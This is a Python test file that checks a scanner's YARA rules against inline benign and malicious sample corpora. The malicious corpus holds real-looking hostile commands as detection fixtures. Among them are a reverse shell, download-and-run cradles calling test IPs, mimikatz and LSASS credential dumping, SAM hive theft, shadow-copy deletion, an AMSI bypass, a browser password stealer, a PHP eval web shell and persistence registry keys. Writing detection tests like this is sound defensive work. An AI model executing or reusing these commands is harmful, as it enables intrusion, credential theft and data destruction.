"""Rule-quality regression tests for the bundled YARA rule sets.

Three guarantees, all evaluated against the rules exactly as the engine loads
them (``yara.compile(filepaths=...)``, one namespace per file — which is why a
private helper rule must live in the file that uses it):

  1. every rule file compiles, on its own and together;
  2. the BENIGN corpus produces zero matches — these are real false-positive
     shapes that previous versions of the rules fired on;
  3. the MALICIOUS corpus produces at least one match each, with the expected
     rule family, so tightening a rule cannot silently drop coverage.

Corpora are inline byte strings on purpose: a fixture file under tests/samples
would also be picked up by the corpus tests in test_engines.py.
"""

from __future__ import annotations

import pytest

yara = pytest.importorskip("yara")

from scanner.paths import rules_dir, scenarios_dir

RULES_ROOT = rules_dir() / "yara"
SCEN_ROOT = scenarios_dir()

_SEVERITIES = {"critical", "high", "medium", "low"}


def _filepaths() -> dict[str, str]:
    """Namespace map identical to YaraEngine(scenario="all")."""
    fp: dict[str, str] = {}
    for f in sorted(RULES_ROOT.glob("*.yar")) + sorted(RULES_ROOT.glob("*.yara")):
        fp[f.stem] = str(f)
    for f in sorted(SCEN_ROOT.glob("*.yar")) + sorted(SCEN_ROOT.glob("*.yara")):
        fp[f"scenario_{f.stem}"] = str(f)
    return fp


@pytest.fixture(scope="module")
def rules():
    return yara.compile(filepaths=_filepaths())


# --------------------------------------------------------------- sample builders

def _pe(payload: bytes, pad: int = 1400) -> bytes:
    """Minimal but structurally valid PE stub — the binary rules gate on
    uint16(0)==MZ plus a real e_lfanew -> "PE\\0\\0", so a text file starting
    with the letters MZ does not qualify."""
    head = bytearray(b"MZ" + b"\x00" * 0x3E)
    head[0x3C:0x40] = (0x40).to_bytes(4, "little")
    return bytes(head) + b"PE\x00\x00" + b"\x00" * 64 + payload + b"\x00" * pad


def _elf(payload: bytes, pad: int = 1400) -> bytes:
    return b"\x7fELF\x02\x01\x01" + b"\x00" * 57 + payload + b"\x00" * pad


# ------------------------------------------------------------------ benign corpus

BENIGN: dict[str, bytes] = {
    # WordPress-flavoured plugin code: superglobals used as *data*, a hex
    # decoder, a callback invoked with request data, a cache write, and the word
    # FilesMan from a file-manager UI.
    "wordpress_plugin.php": b"""<?php
require_once( ABSPATH . 'wp-admin/includes/file.php' );
include($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');

function ah_decode_signature($hex) {
    return pack('H*', $hex);
}

$fields = array_filter($_POST);
$cb = 'sanitize_text_field';
$name = call_user_func($cb, $_POST['n']);
$cacheFile = WP_CONTENT_DIR . '/cache/' . md5($name) . '.html';
file_put_contents($cacheFile, $_POST['body']);

$views = array('FilesMan' => 'File manager', 'Grid' => 'Grid view');
echo '<div class="' . esc_attr($views['FilesMan']) . '">';
""",

    # Legacy ASP that writes a report file — FileSystemObject + CreateTextFile +
    # .Write() is ordinary here; nothing is request-controlled.
    "legacy_report.asp": b"""<%@ Language=VBScript %>
<%
Dim fso, ts, path
path = Server.MapPath("/reports/daily.txt")
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set ts = fso.CreateTextFile(path, True)
ts.Write("Daily report generated " & Now())
ts.WriteLine("rows: " & rs.RecordCount)
ts.Close
Set fso = Nothing
%>
""",

    # Product names that contain shell names as substrings.
    "vendor_catalog.js": b"""const products = [
  { id: 1, name: "WSO2 Identity Server", vendor: "WSO2", version: "7.0.0" },
  { id: 2, name: "c99shellDocs", note: "legacy documentation bundle, archived" },
];
export function findProduct(id) {
  return products.find((p) => p.id === id) || null;
}
""",

    # Everyday administrative PowerShell: remoting, an internal download, and a
    # bypass flag mentioned in the usage comment.
    "deploy_service.ps1": b"""<#
  Usage: powershell.exe -ExecutionPolicy Bypass -File .\\deploy_service.ps1
#>
param([string]$ComputerName = "SRV01")

$svc = Get-Service -Name "Spooler" -ComputerName $ComputerName
if ($svc.Status -ne "Running") { Start-Service -Name "Spooler" }

Invoke-Command -ComputerName $ComputerName -ScriptBlock { Get-Service | Where-Object Status -eq 'Stopped' }

$manifest = Invoke-WebRequest -Uri "http://intranet.corp.local/deploy/manifest.json" -UseBasicParsing
$data = ConvertFrom-Json $manifest.Content
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Contoso\\Deploy" -Name "Build" -Value $data.build

$parts = @("a", "b", "c")
$joined = -join ($parts)
Write-Output ([string]::Join(",", $parts))
""",

    # Backup script that *lists* shadow copies and queries the WMI class — the
    # nouns of T1490 without the destructive verb.
    "backup_check.ps1": b"""# Nightly backup verification
$shadows = vssadmin list shadows
Get-WmiObject -Class Win32_ShadowCopy | Format-Table DeviceObject, InstallDate
if (-not $shadows) { Write-Warning "no shadow copies present" }
wbadmin get versions
Write-Output "backup catalog verified"
""",

    # Ordinary maintenance shell script, including the curl|sh installer idiom
    # and read-only references to cron and ld.so.preload.
    "maintenance.sh": b"""#!/bin/bash
set -euo pipefail

if [ -f /etc/ld.so.preload ]; then
  echo "warning: /etc/ld.so.preload exists, review it" >&2
fi

ls -l /etc/cron.daily/ /var/spool/cron/ || true
wget -qO- https://get.example.com/install.sh | sh

tar czf /backup/etc-$(date +%F).tgz /etc
rsync -a /var/www/ backup@10.0.0.9:/srv/www/
grep -c '' /root/.ssh/authorized_keys
""",

    # Ordinary Python service code.
    "report_service.py": b"""import os
import socket
import subprocess
from pathlib import Path


def disk_usage(path: str) -> int:
    return sum(f.stat().st_size for f in Path(path).rglob("*") if f.is_file())


def hostname() -> str:
    return socket.gethostname()


def run_report(target: str) -> str:
    out = subprocess.run(["du", "-sh", target], capture_output=True, check=False)
    return out.stdout.decode("utf-8", "replace")


if __name__ == "__main__":
    print(hostname(), disk_usage(os.getcwd()))
""",

    # Threat-intel / detection content: names every technique but performs none.
    "detection_notes.py": b'''"""Hunting notes for the IR team."""

INDICATORS = {
    "mimikatz": "look for privilege::debug in command lines",
    "psexec": "PSEXESVC service installs",
    "rootkits": ["diamorphine", "libprocesshider"],
    "ransomware": ["REvil", "LockBit", "Conti"],
    "c2": ["Covenant", "Sliver", "beacon"],
}


def describe(key: str) -> str:
    return INDICATORS.get(key, "unknown")
''',

    # A build/deploy shell script that touches services and archives.
    "release.sh": b"""#!/bin/sh
systemctl daemon-reload
systemctl restart myapp.service
chmod 0644 /etc/systemd/system/myapp.service
nc -z localhost 8080 && echo "listening"
python3 -c "import json,sys; json.load(sys.stdin)" < config.json
""",

    # Node-ish crypto helper: pack/hex/AES vocabulary without any execution sink.
    "crypto_util.js": b"""const crypto = require("crypto");
const AES_IV = Buffer.alloc(16, 0);
function encrypt(plain, key) {
  const cipher = crypto.createCipheriv("aes-256-gcm", key, AES_IV);
  return Buffer.concat([cipher.update(plain, "utf8"), cipher.final()]).toString("hex");
}
const ser = "https://vault.internal.corp/v1/keys";
module.exports = { encrypt, ser };
""",

    # Chrome profile *cleanup* utility: reads the store, never decrypts it.
    "profile_cleanup.py": b"""import os
import shutil

CHROME = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")


def clear_cache():
    for sub in ("Cache", "Code Cache", "GPUCache"):
        target = os.path.join(CHROME, "Default", sub)
        if os.path.isdir(target):
            shutil.rmtree(target, ignore_errors=True)


def profile_size():
    return sum(os.path.getsize(os.path.join(r, f))
               for r, _, fs in os.walk(CHROME) for f in fs)
""",

    # Legitimate config handling: base64 + -join + encoding round-trip are
    # ordinary language features, not obfuscation.
    "config_decode.ps1": b"""$raw = Get-Content -Path .\\config.b64 -Raw
$bytes = [Convert]::FromBase64String($raw)
$json = [Text.Encoding]::UTF8.GetString($bytes)
$flat = -join ($json -split "`n")
Write-Output ([string]::Join(";", $flat))
""",

    # Blockchain documentation: algorithm names without a miner or a pool.
    "algorithms.py": b'''"""Reference notes on proof-of-work algorithms."""

ALGORITHMS = ["cryptonight", "randomx", "ethash", "sha256d"]


def is_memory_hard(name: str) -> bool:
    return name in {"cryptonight", "randomx"}
''',

    # Installer writing a perfectly ordinary systemd unit.
    "install_unit.sh": b"""#!/bin/bash
cat > /etc/systemd/system/myapp.service <<'EOF'
[Unit]
Description=My App
[Service]
ExecStart=/usr/bin/myapp --config /etc/myapp.conf
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable myapp.service
""",

    # Inventory script that reads autostart locations instead of writing them.
    "audit_autostart.bat": b"""@echo off
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
schtasks /query /fo LIST /v
sc query type= service state= all
dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
""",

    # Ordinary JSP page.
    "list.jsp": b"""<%@ page contentType="text/html;charset=UTF-8" %>
<%@ page import="java.util.List" %>
<html><body>
<% List<String> rows = (List<String>) request.getAttribute("rows"); %>
<ul><% for (String r : rows) { %><li><%= r %></li><% } %></ul>
</body></html>
""",

    # A PE that is not any of the modelled families.
    "generic_tool.exe": _pe(b"CreateFileW\x00ReadFile\x00Sleep\x00User-Agent: MyTool/1.0\x00"),

    # An ELF that merely links libc.
    "generic_binary.elf": _elf(b"libc.so.6\x00__libc_start_main\x00readdir\x00dlsym\x00"),
}


# --------------------------------------------------------------- malicious corpus
# (name, content, rule-name prefix that must appear among the matches)

MALICIOUS: list[tuple[str, bytes, str]] = [
    ("ps_encoded_downloader.ps1",
     b"powershell.exe -nop -w hidden -ep bypass -enc "
     b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8Adw"
     b"BuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAvAGEAJwApAA==\n",
     "PS_"),

    ("ps_cradle.ps1",
     b"$c = New-Object System.Net.WebClient\n"
     b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/stage.ps1')\n",
     "PS_"),

    ("ps_amsi_bypass.ps1",
     b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
     b".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
     "PS_"),

    ("mimikatz_run.txt",
     b"privilege::debug\r\nsekurlsa::logonpasswords\r\nlsadump::dcsync /domain:corp.local /user:krbtgt\r\nexit\r\n",
     "CRED_"),

    ("lsass_dump.cmd",
     b"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full\r\n",
     "CRED_"),

    ("hive_theft.cmd",
     b"reg save hklm\\sam C:\\temp\\sam.hiv\r\nreg save hklm\\system C:\\temp\\sys.hiv\r\n",
     "CRED_"),

    ("cobaltstrike_beacon_cfg.txt",
     b"pipe name: \\\\.\\pipe\\msagent_7f2a\nspawnto: %windir%\\sysnative\\rundll32.exe\n"
     b"sleep 60000 jitter 37\n",
     "C2_"),

    ("cobaltstrike_beacon.bin",
     _pe(b"ReflectiveLoader\x00beacon.x64.dll\x00%s as %s\\%s: %d\x00"
         b"%d is an x86 process (can't inject x64 content)\x00"),
     "C2_"),

    ("malleable.profile",
     b'set sleeptime "45000";\nset jitter    "30";\nset useragent "Mozilla/5.0 (Windows NT 10.0)";\n'
     b'http-get {\n    set uri "/api/v2/updates";\n    client {\n        header "Accept" "*/*";\n    }\n}\n',
     "C2_"),

    ("empire_stager.ps1",
     b"$ser = 'https://198.51.100.20:443';\n$t = '/admin/get.php';\n"
     b"$AES_IV = $IV;\nfunction Start-Negotiate { param($s,$SK,$UA) }\n",
     "C2_"),

    ("linux_persistence.sh",
     b"#!/bin/sh\n"
     b"echo '/usr/lib/libhide.so' > /etc/ld.so.preload\n"
     b"echo '* * * * * root curl -s http://198.51.100.9/x.sh | bash' >> /etc/cron.d/apache2\n",
     "LIN_"),

    ("linux_revshell.sh",
     b"#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.4/4444 0>&1\n",
     "LIN_"),

    ("mirai_dropper.elf",
     _elf(b"/bin/busybox\x00MIRAI\x00/dev/watchdog\x00TSource Engine Query\x00"),
     "LIN_"),

    ("ransom_note.txt",
     b"!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!\r\n\r\n"
     b"To decrypt your files you must buy our decryptor. Payment is accepted in bitcoin only.\r\n"
     b"Contact us at recovery-help@protonmail.com or visit our site at http://qwe4tzx.onion/\r\n"
     b"Your private key is stored on our server.\r\n",
     "RANSOM_"),

    ("ransom_prep.bat",
     b"@echo off\r\n"
     b"vssadmin.exe delete shadows /all /quiet\r\n"
     b"wbadmin delete catalog -quiet\r\n"
     b"bcdedit /set {default} recoveryenabled no\r\n",
     "RANSOM_"),

    ("ssh_key_drop.sh",
     b"#!/bin/bash\n"
     b"ssh root@10.0.0.7 \"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9attacker' >> /root/.ssh/authorized_keys\"\n",
     "LATERAL_"),

    ("wmic_remote_exec.bat",
     b"wmic /node:10.0.0.5 /user:CORP\\admin process call create \"powershell -w hidden -enc SQBFAFgA\"\r\n",
     "LATERAL_"),

    ("impacket_runner.py",
     b"from impacket.dcerpc.v5 import transport\nfrom impacket.smbconnection import SMBConnection\n"
     b"# secretsdump-style flow\n",
     "LATERAL_"),

    ("runkey_persist.bat",
     b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ "
     b"/d \"powershell -w hidden -enc SQBFAFgA\" /f\r\n",
     "PERSIST_"),

    ("schtask_persist.bat",
     b"schtasks /create /sc minute /mo 10 /tn \"Updater\" /tr \"powershell.exe -nop -w hidden "
     b"-File C:\\ProgramData\\u.ps1\" /ru system /f\r\n",
     "PERSIST_"),

    ("sethc_backdoor.bat",
     b"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution "
     b"Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f\r\n",
     "PERSIST_"),

    ("psexec_remote.bat",
     b"psexec.exe \\\\10.0.0.5 -u CORP\\admin -p Passw0rd! cmd.exe /c whoami\r\n",
     "LATERAL_"),

    ("winrm_payload.ps1",
     b"Invoke-Command -ComputerName DC01 -ScriptBlock { IEX (New-Object Net.WebClient)"
     b".DownloadString('http://198.51.100.11/p.ps1') }\n",
     "LATERAL_"),

    ("service_persist.bat",
     b"sc create Updater binPath= \"cmd.exe /c powershell -w hidden -File C:\\ProgramData\\u.ps1\" "
     b"start= auto\r\n",
     "PERSIST_"),

    ("wmi_subscription.ps1",
     b"$f = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{"
     b"Name='upd'; Query=\"SELECT * FROM __InstanceModificationEvent\"}\n"
     b"$c = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription "
     b"-Arguments @{Name='upd'; CommandLineTemplate=\"powershell -w hidden -enc SQBFAFgA\"}\n"
     b"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription "
     b"-Arguments @{Filter=$f; Consumer=$c}\n",
     "PERSIST_"),

    ("xmrig_installer.sh",
     b"#!/bin/sh\ncurl -sL http://198.51.100.30/xmrig -o /tmp/.x\n"
     b"/tmp/.x --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444 -u 4Awallet\n",
     "LIN_"),

    ("browser_stealer.py",
     b"import sqlite3, win32crypt\n"
     b"db = sqlite3.connect(r'C:\\Users\\v\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')\n"
     b"for row in db.execute('SELECT origin_url, username_value, password_value FROM logins'):\n"
     b"    pw = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]\n",
     "CRED_"),

    ("china_chopper.php",
     b"<?php @eval($_POST['pass']); ?>",
     "WS_"),

    # One sample per remaining rule in the touched files, so a future tightening
    # cannot silently remove a family from coverage.
    ("meterpreter.dll",
     _pe(b"metsrv.x64.dll\x00core_channel_open\x00stdapi_sys_process_execute\x00"),
     "C2_"),

    ("sliver_implant.elf",
     _elf(b"sliverpb\x00tunnelpb\x00SliverRPC\x00"),
     "C2_"),

    ("havoc_demon.exe",
     _pe(b"KaynLdr\x00DemonInit\x00"),
     "C2_"),

    ("covenant_grunt.exe",
     _pe(b"GruntStager\x00Covenant\x00ProfileHttpHeaders\x00"),
     "C2_"),

    ("generic_beacon.exe",
     _pe(b"User-Agent: Mozilla\x00checkin\x00jitter\x00sleep\x00cmd.exe /c \x00"),
     "C2_"),

    ("ntds_ifm.cmd",
     b'ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ifm" q q\r\n',
     "CRED_"),

    ("kerberoast_hashes.txt",
     b"$krb5tgs$23$*svc_sql$corp.local*$a1b2c3d4e5f6\n",
     "CRED_"),

    ("lazagne_run.cmd",
     b"lazagne.config all -oN -output C:\\temp\\creds\r\n",
     "CRED_"),

    ("remote_service.cmd",
     b'sc \\\\10.0.0.5 create Upd binpath= "cmd /c powershell -enc SQBFAFgA" start= auto\r\n',
     "LATERAL_"),

    ("processhider.so",
     _elf(b"libprocesshider\x00process_to_filter\x00dlsym\x00RTLD_NEXT\x00readdir64\x00"),
     "LIN_"),

    ("winlogon_tamper.cmd",
     b'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit '
     b'/d "C:\\windows\\system32\\userinit.exe,C:\\ProgramData\\evil.exe" /f\r\n',
     "PERSIST_"),

    ("startup_drop.cmd",
     b'copy /y C:\\ProgramData\\u.vbs "C:\\Users\\v\\AppData\\Roaming\\Microsoft\\Windows\\'
     b'Start Menu\\Programs\\Startup\\u.vbs"\r\n',
     "PERSIST_"),

    ("reflective_loader.ps1",
     b"$b = [Convert]::FromBase64String($e)\n[System.Reflection.Assembly]::Load($b)\n"
     b"$k = Add-Type -MemberDefinition $sig -Name kernel32 -PassThru  # VirtualAlloc\n",
     "PS_"),

    ("obfuscated.ps1",
     b"$a = ('{0}{1}' -f 'IE','X'); $c = [char]73+[char]69+[char]88+[char]32+[char]40;\n"
     b"-join ($c) | IEX\n",
     "PS_"),

    ("wannacry.exe",
     _pe(b"WNcry@2ol7\x00msg/m_english.wnry\x00"),
     "Ransomware_"),

    ("encryptor.exe",
     _pe(b"CryptGenKey\x00FindFirstFileW\x00vssadmin\x00delete shadows\x00"),
     "RANSOM_"),

    ("ryuk_note.txt",
     b"Your network has been penetrated. See RyukReadMe.txt on every folder.\n",
     "RANSOM_"),

    ("encryptor_rename.py",
     b'import os\nfor f in files:\n    os.rename(f, f + ".locked")\n'
     b'# handles .locked .locked .locked .locked leftovers\n',
     "RANSOM_"),
]


# ------------------------------------------------------------------------- tests

def test_every_rule_file_compiles_standalone():
    """Each file is its own namespace in the engine, so a rule may not depend on
    a private helper declared in a different file."""
    for ns, path in _filepaths().items():
        try:
            yara.compile(filepaths={ns: path})
        except yara.Error as exc:  # pragma: no cover - failure path
            pytest.fail(f"{path} failed to compile standalone: {exc}")


def test_all_rule_files_compile_together(rules):
    assert rules is not None


def test_every_rule_declares_a_calibrated_severity(rules):
    """Severity drives the score in yara_engine._SEVERITY_SCORE; an unknown or
    missing label silently degrades to 50/55."""
    bad = []
    for r in rules:  # iterating a Rules object yields the compiled rules
        if getattr(r, "is_private", False):
            continue  # ah_is_* content gates carry no severity by design
        sev = (r.meta or {}).get("severity")
        if sev is None or str(sev).lower() not in _SEVERITIES:
            bad.append(f"{r.identifier}={sev!r}")
    assert not bad, "rules with missing/uncalibrated severity meta: " + ", ".join(bad)


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_benign_corpus_has_no_matches(rules, name):
    matches = rules.match(data=BENIGN[name])
    assert not matches, f"{name} false-positived on: {[m.rule for m in matches]}"


@pytest.mark.parametrize("name,content,prefix", MALICIOUS, ids=[m[0] for m in MALICIOUS])
def test_malicious_corpus_is_detected(rules, name, content, prefix):
    matches = [m.rule for m in rules.match(data=content)]
    assert matches, f"{name} produced no match at all"
    assert any(m.startswith(prefix) for m in matches), (
        f"{name} matched {matches} but expected a {prefix}* rule"
    )
